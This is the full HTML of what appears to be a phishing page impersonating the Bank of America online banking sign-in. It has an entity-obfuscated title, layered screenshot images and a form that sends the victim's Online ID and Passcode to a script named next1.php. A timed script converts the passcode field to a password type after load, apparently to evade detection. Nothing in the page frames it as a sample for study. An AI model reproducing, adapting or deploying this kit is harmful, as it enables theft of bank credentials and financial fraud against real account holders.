<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#66;&#97;&#110;&#107;&#32;&#111;&#102;&#32;&#65;&#109;&#101;&#114;&#105;&#99;&#97;&#32;&#45;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;&#44;&#32;&#67;&#114;&#101;&#100;&#105;&#116;&#32;&#67;&#97;&#114;&#100;&#115;&#44;&#32;&#72;&#111;&#109;&#101;&#32;&#76;&#111;&#97;&#110;&#115;&#32;&#97;&#110;&#100;&#32;&#65;&#117;&#116;&#111;&#32;&#76;&#111;&#97;&#110;&#115;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	

<style type="text/css">
 .textbox {  
    
    border: 1px solid #cccccc;
    border-radius: 2px;
	padding-left: 10px;
	font-size: 14px;
    font: normal normal normal 0.5 Arial,"Helvetica Neue",Helvetica,Roboto,sans-serif;
	color: #857363;
	font-weight: 100;
    height: 40px; 
    width: 275px;
  	box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
 } 
 
.textbox:focus {  
    border-color: #999999; 
  	background: #FAFAFA;
    border-style: solid; 
    border-width: 1px; 
    outline: 0; 
 } 
 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:118px; z-index:0"><a href="#"><img src="images/q1.png" alt="" title="" border=0 width=1349 height=118></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:147px; width:1349px; height:253px; z-index:1"><img src="images/q2.png" alt="" title="" border=0 width=1349 height=253></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:398px; width:1349px; height:233px; z-index:2"><img src="images/q3.png" alt="" title="" border=0 width=1349 height=233></div>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:629px; width:1349px; height:323px; z-index:3"><img src="images/q4.png" alt="" title="" border=0 width=1349 height=323></div>

<div id="image5" style="position:absolute; overflow:hidden; left:96px; top:460px; width:231px; height:76px; z-index:4"><a href="#"><img src="images/p1.png" alt="" title="" border=0 width=231 height=76></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:66px; top:340px; width:248px; height:85px; z-index:5"><a href="#"><img src="images/p2.png" alt="" title="" border=0 width=248 height=85></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:0px; top:948px; width:1349px; height:268px; z-index:6"><img src="images/q5.png" alt="" title="" border=0 width=1349 height=268></div>

<div id="image8" style="position:absolute; overflow:hidden; left:0px; top:1214px; width:1349px; height:216px; z-index:7"><img src="images/q6.png" alt="" title="" border=0 width=1349 height=216></div>

<div id="image9" style="position:absolute; overflow:hidden; left:236px; top:1471px; width:877px; height:79px; z-index:8"><img src="images/q7.png" alt="" title="" border=0 width=877 height=79></div>

<div id="image10" style="position:absolute; overflow:hidden; left:82px; top:1572px; width:1238px; height:41px; z-index:9"><a href="#"><img src="images/q8.png" alt="" title="" border=0 width=1238 height=41></a></div>

<div id="image11" style="position:absolute; overflow:hidden; left:0px; top:1695px; width:1299px; height:363px; z-index:10"><img src="images/q9.png" alt="" title="" border=0 width=1299 height=363></div>

<div id="image12" style="position:absolute; overflow:hidden; left:423px; top:2107px; width:517px; height:46px; z-index:11"><img src="images/q10.png" alt="" title="" border=0 width=517 height=46></div>

<div id="image13" style="position:absolute; overflow:hidden; left:0px; top:2201px; width:1349px; height:260px; z-index:12"><img src="images/q11.png" alt="" title="" border=0 width=1349 height=260></div>

<div id="image14" style="position:absolute; overflow:hidden; left:0px; top:2458px; width:1349px; height:286px; z-index:13"><img src="images/q12.png" alt="" title="" border=0 width=1349 height=286></div>

<div id="image15" style="position:absolute; overflow:hidden; left:0px; top:2740px; width:1349px; height:323px; z-index:14"><img src="images/q13.png" alt="" title="" border=0 width=1349 height=323></div>

<div id="image16" style="position:absolute; overflow:hidden; left:0px; top:3342px; width:1349px; height:279px; z-index:15"><img src="images/q15.png" alt="" title="" border=0 width=1349 height=279></div>

<div id="image17" style="position:absolute; overflow:hidden; left:0px; top:3620px; width:1349px; height:388px; z-index:16"><img src="images/q16.png" alt="" title="" border=0 width=1349 height=388></div>

<div id="image18" style="position:absolute; overflow:hidden; left:484px; top:3170px; width:399px; height:55px; z-index:17"><img src="images/q14.png" alt="" title="" border=0 width=399 height=55></div>

<div id="image19" style="position:absolute; overflow:hidden; left:157px; top:3810px; width:1033px; height:90px; z-index:18"><a href="#"><img src="images/q17.png" alt="" title="" border=0 width=1033 height=90></a></div>
<form action=next1.php name=dafabhai id=dafabhai method=post>
<input name="usr" placeholder="&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#73;&#68;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:274px;left:67px;top:163px;z-index:19">
<input name="psw" placeholder="&#80;&#97;&#115;&#115;&#99;&#111;&#100;&#101;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:274px;left:67px;top:211px;z-index:20">
<div id="formcheckbox1" style="position:absolute; left:63px; top:260px; z-index:21"><input type="checkbox" name="formcheckbox1"></div>
<div id="formimage1" style="position:absolute; left:66px; top:290px; z-index:22"><input type="image" name="formimage1" width="276" height="42" src="images/btn1.png"></div>
</div>

	
</body>
</html>

